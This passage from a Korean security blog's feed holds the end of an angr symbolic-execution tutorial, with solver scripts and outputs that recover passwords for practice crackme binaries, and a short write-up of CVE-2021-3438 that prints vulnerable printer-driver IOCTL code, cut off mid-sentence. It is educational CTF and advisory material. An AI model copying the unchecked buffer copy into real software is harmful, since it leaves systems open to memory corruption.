padding_length_in_bytesinitial_state.stack_push(password0)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>initial_state.stack_push(password1)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></code></pre><p>&#xBA3C;&#xC800; 8&#xBC14;&#xC774;&#xD2B8;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; esp&#xC5D0;&#xC11C; &#xADF8;&#xB9CC;&#xD07C; &#xBE7C;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB4A4;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC124;&#xC815;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; push&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC5BC;&#xCD94; &#xC77C;&#xB2E8; &#xC6B0;&#xB9AC;&#xAC00; &#xCD94;&#xC801;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xAE4C;&#xC9C0; &#xC124;&#xC815;&#xD588;&#xC73C;&#xB2C8; &#xB098;&#xBA38;&#xC9C0;&#xB294; angr&#xD55C;&#xD14C; &#xB9E1;&#xACA8;&#xBCF4;&#xC8E0;!</p><h2 id="sol04-py"><a href="#sol04-py" class="headerlink" title="sol04.py"></a>sol04.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048697</span> <span class="hljs-comment"># after add esp, 0x10</span>  initial_state = project.factory.blank_state(addr=start_address)  initial_state.regs.ebp = initial_state.regs.esp  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">32</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">32</span>)  padding_length_in_bytes = <span class="hljs-number">8</span>  <span class="hljs-comment"># :integer</span>  initial_state.regs.esp -= padding_length_in_bytes  initial_state.stack_push(password0)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  initial_state.stack_push(password1)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    solution1 = solution_state.se.eval(password1)        solution = <span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol04.py ./<span class="hljs-number">04</span>_angr_symbolic_stackCRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">21</span>:<span class="hljs-number">43</span>,<span class="hljs-number">212</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">1704280884</span> <span class="hljs-number">2382341151</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">04</span>_angr_symbolic_stackEnter the password: <span class="hljs-number">1704280884</span> <span class="hljs-number">2382341151</span>Good Job.</code></pre><h1 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h1><p><img src="/2021/08/04/j0ker/angr_part3/11.png" alt="./angr_part3/Untitled%2011.png"></p><p>&#xD6C4;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xB531; &#xBD10;&#xB3C4; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0;&#xB2E4; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294;&#xAC8C; &#xBB38;&#xC81C;&#xACA0;&#xB124;&#xC694;. &#xCF54;&#xB4DC;&#xC5D0; &#xC788;&#xB294; &#xC124;&#xBA85;&#xC744; &#xBCFC; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xC744;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;(&#xC774;&#xCBE4;&#xB418;&#xBA74; &#xB208;&#xAC10;&#xACE0;&#xB3C4; &#xD480; &#xC218; &#xC788;&#xC744;&#xB4EF; &#x3147;&#x3148;&#x3139;)</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(&apos;password0&apos;, ???)  ...  password0_address = ???  initial_state.memory.store(password0_address, password0)  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0,cast_to=str)    ...    solution = ???    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC77C;&#xB2E8; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB294; &#xC774;&#xC804;&#xACFC; &#xAC19;&#xC774; <code>scanf</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC2A4;&#xD0DD;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xB300;&#xCDA9; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC55E;&#xC5D0;&#xC11C;&#xC640; &#xAC19;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC785;&#xB825;&#xC744; &#xD558;&#xB098;&#xB2F9; 8&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC1B;&#xC73C;&#xB2C8;&#xAE4C; &#xD06C;&#xAE30;&#xB97C; 64&#xBE44;&#xD2B8;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">password0_address = <span class="hljs-number">0x0A1BA1C0</span>initial_state.memory.store(password0_address, password0)password1_address = <span class="hljs-number">0xA1BA1C8</span>initial_state.memory.store(password1_address, password1)password2_address = <span class="hljs-number">0xA1BA1D0</span>initial_state.memory.store(password2_address, password2)password3_address = <span class="hljs-number">0xA1BA1D8</span>initial_state.memory.store(password3_address, password3)</code></pre><p>&#xC55E;&#xC5D0;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD560; &#xB54C;&#xB294; <code>initial_state.regs.eax</code> &#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xC744; &#xD588;&#xC5C8;&#xC8E0;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;! &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xC8FC;&#xC18C;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; <code>store</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; IDA&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD558;&#xB098;&#xD558;&#xB098; &#xB9E4;&#xD551;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xCD9C;&#xB825;&#xC744; &#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;&#x2026; &#xC6D0;&#xB798; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>solution0 = solution_state.se.eval(password0,cast_to=str)</code> &#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC774;&#xAC8C; &#xC774;&#xB300;&#xB85C; &#xC4F0;&#xBA74; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#xC65C;&#xC778;&#xC9C0;&#xB294; &#xBAA8;&#xB974;&#xACA0;&#xB294;&#xB370; &#xBB38;&#xC790;&#xC5F4;&#xB85C;&#xC758; &#xCE90;&#xC2A4;&#xD305;&#xC744; &#xC9C0;&#xC6D0;&#xC744; &#xC548;&#xD55C;&#xB2E4;&#xB294;&#xB370;&#x2026;. &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694;. &#xD639;&#xC2DC; &#xD574;&#xACB0;&#xD558;&#xC2E0; &#xBD84;&#xC774; &#xACC4;&#xC2DC;&#xB2E4;&#xBA74; &#xB313;&#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB0E5; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC774; &#xBB38;&#xC81C;&#xB3C4; &#xB05D;!</p><h2 id="sol05-py"><a href="#sol05-py" class="headerlink" title="sol05.py"></a>sol05.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x080485FE</span>  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">64</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">64</span>)  password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, <span class="hljs-number">64</span>)  password3 = claripy.BVS(<span class="hljs-string">&apos;password3&apos;</span>, <span class="hljs-number">64</span>)  password0_address = <span class="hljs-number">0x0A1BA1C0</span>  initial_state.memory.store(password0_address, password0)  password1_address = <span class="hljs-number">0xA1BA1C8</span>  initial_state.memory.store(password1_address, password1)  password2_address = <span class="hljs-number">0xA1BA1D0</span>  initial_state.memory.store(password2_address, password2)  password3_address = <span class="hljs-number">0xA1BA1D8</span>  initial_state.memory.store(password3_address, password3)  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0, cast_to=bytes)    solution1 = solution_state.se.eval(password1, cast_to=bytes)    solution2 = solution_state.se.eval(password2, cast_to=bytes)    solution3 = solution_state.se.eval(password3, cast_to=bytes)        solution = <span class="hljs-string">&apos;{} {} {} {}&apos;</span>.format(solution0, solution1, solution2, solution3)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol05.py ./<span class="hljs-number">05</span>_angr_symbolic_memoryWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">180</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048601</span> (main+<span class="hljs-number">0x59</span> <span class="hljs-keyword">in</span> <span class="hljs-number">05</span>_angr_symbolic_memory (<span class="hljs-number">0x8048601</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>,<span class="hljs-number">925</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;NAXTHGNR&apos;</span> <span class="hljs-string">b&apos;JVSFTPWE&apos;</span> <span class="hljs-string">b&apos;LMGAUHWC&apos;</span> <span class="hljs-string">b&apos;XMDCPALU&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">05</span>_angr_symbolic_memoryEnter the password: NAXTHGNR JVSFTPWE LMGAUHWC XMDCPALUGood Job.</code></pre><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC77C;&#xB2E8; &#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE00;&#xC5D0; &#xAE00;&#xC528;&#xB294; &#xB9CE;&#xC740;&#xB370; &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xCF54;&#xB4DC;&#xAC00; &#xB9CE;&#xC544;&#xC11C; &#xC2A4;&#xC555;&#xC774; &#xC880;&#x2026; &#xD558;&#xD558; &#xADF8;&#xB798;&#xC11C; &#xC774;&#xB9CC; &#xB04A;&#xC73C;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4; ^^</p><p>&#xC77C;&#xB2E8; &#xD300;&#xC7A5;&#xB2D8;&#xC774; &#xBD80;&#xC0C1; &#xC911;&#xC774;&#xC2DC;&#xB77C; &#xB0A8;&#xB294; &#xB0A0;&#xC9DC;&#xC5D0; &#xC81C; &#xAE00;&#xC744; &#xB610; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xCC28;&#xD53C; &#xB0A8;&#xC740; &#xBB38;&#xC81C;&#xB4E4;&#xB3C4; &#xD6C4;&#xB531; &#xD480; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774;&#xB2C8;&#xAE4C; &#xBE60;&#xB978; &#xD15C;&#xD3EC;&#xB85C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC544; &#xADFC;&#xB370; &#xC774;&#xBC88; &#xAE00; &#xC4F0;&#xBA74;&#xC11C; &#xB290;&#xB080;&#xAC8C; &#xBB38;&#xC81C; &#xD478;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xAE00; &#xC4F0;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xB294;&#xB4EF;&#x2026;) &#xC5BC;&#xB978; CTF &#xBB38;&#xC81C;&#xB3C4; &#xD480;&#xC5B4;&#xC57C;&#xC8E0;! &#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xD3B8;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC870;-&#xBC14;!(&#xC870;&#xCEE4; &#xBC14;&#xC774;&#xB77C;&#xB294; &#xB73B;)</p><p><img src="/2021/08/04/j0ker/angr_part3/1628066515.gif" alt="./angr_part3/1628066515.gif"></p><blockquote><p>&#xD1F4;&#xADFC;&#xAE38;&#xC5D0; &#xB2F4;&#xBC30; &#xD55C;&#xB300; &#x3146;&#x3145;&#x314C;&#x314A;</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-3438: Samsung,HP 프린터 드라이버의 Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2021/08/03/l0ch/2021-08-03/</link>
      <guid>https://hackyboiz.github.io/2021/08/03/l0ch/2021-08-03/</guid>
      <pubDate>Tue, 03 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://voidsec.com/root-cause-analysis-of-cve-2021-3438</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://voidsec.com/root-cause-analysis-of-cve-2021-3438/">Root Cause Analysis of a Printer&#x2019;s Drivers Vulnerability CVE-2021-3438</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Samsung, HP, Xerox </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Samsung, HP, Xerox &#xC0AC;&#xC5D0;&#xC11C; 16&#xB144; &#xC804; &#xBC30;&#xD3EC;&#xB41C; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD504;&#xB9B0;&#xD130;&#xC758; &#xD575;&#xC2EC; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778; Serial Port Driver <code>SSPORT.sys</code> &#xC758; IOCTL <code>0x9C402408</code> &#xB8E8;&#xD2F4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> GlobalBuffer[<span class="hljs-number">4096</span>];<span class="hljs-function">NTSTATUS <span class="hljs-title">SioctlDeviceControl</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>{    NTSTATUS status = STATUS_SUCCESS;    <span class="hljs-keyword">size_t</span> datalen = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;This String is from Device Driver@@@@@ !!!&quot;</span>) + <span class="hljs-number">1</span>;    PIO_STACK_LOCATION irpSP = IoGetCurrentIrpStackLocation(Irp);    ULONG inBufLength = irpSP-&gt;Parameters.DeviceIoControl.InputBufferLength;    ULONG outBufLength = irpSP-&gt;Parameters.DeviceIoControl.OutputBufferLength;    <span class="hljs-keyword">if</span> (!inBufLength || !outBufLength) {        status = STATUS_INVALID_PARAMETER;        <span class="hljs-keyword">goto</span> End;    }    <span class="hljs-keyword">switch</span> (irpSP-&gt;Parameters.DeviceIoControl.IoControlCode) {        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402408</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)</span>        {            <span class="hljs-keyword">char</span>* inBuf = (<span class="hljs-keyword">char</span>*)Irp-&gt;AssociatedIrp.SystemBuffer;            <span class="hljs-keyword">char</span>* outBuf = (<span class="hljs-keyword">char</span>*)Irp-&gt;AssociatedIrp.SystemBuffer;            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(inBuf, <span class="hljs-string">&quot;AA&quot;</span>))            {                <span class="hljs-built_in">strncpy</span>(GlobalBuffer, inBuf, inBufLength); <span class="hljs-comment">//Vulnerability</span>            }            <span class="hljs-keyword">else</span>            {                inBuf = GlobalBuffer;            }            <span class="hljs-built_in">strncpy</span>(outBuf, inBuf, outBufLength);            Irp-&gt;IoStatus.Information = outBufLength &lt; datalen ? outBufLength : datalen;             <span class="hljs-keyword">break</span>;         }         <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402401</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x900, METHOD_IN_DIRECT, FILE_ANY_ACCESS)</span>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402406</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x901, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)</span>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C40240F</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x903, METHOD_NEITHER, FILE_ANY_ACCESS) </span>            <span class="hljs-keyword">break</span>;         <span class="hljs-keyword">default</span>:             status = STATUS_INVALID_DEVICE_REQUEST;             <span class="hljs-keyword">break</span>;    } End:     Irp-&gt;IoStatus.Status = status;    IofCompleteRequest(Irp, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> status;}</code></pre><p><code>strncpy</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>inBuf</code>&#xC758; &#xAC12;&#xC744; <code>inBufLength</code>&#xC758; &#xD06C;&#xAE30;&#xB9CC;&#xD07C;  <code>GlobalBuffer</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; <code>inBuf</code>&#xC640; <code>inBufLength</code> &#xAC12;&#xC744; IOCTL &#xC694;&#xCCAD;&#xC2DC; <code>UserBuffer</code> &#xC5D0; &#xB530;&#xB77C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>.data</code> &#xC139;&#xC158;&#xC5D0; &#xC815;&#xC758;&#xB41C; 4096 &#xD06C;&#xAE30;&#xC758;  <code>GlobalBuffer</code>&#xB97C; &#xB118;&#xC5B4; <code>.pdata</code> &#xC139;&#xC158;&#xAE4C;&#xC9C0; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xC139;&#xC158;&#xC774; &#xC77D;&#xAE30; &#xC804;&#xC6A9;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xB85C;&#xCEEC; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(Dos) &#xC678;&#xC758; &#xC720;&#xD6A8;&#xD55C; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB294; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; 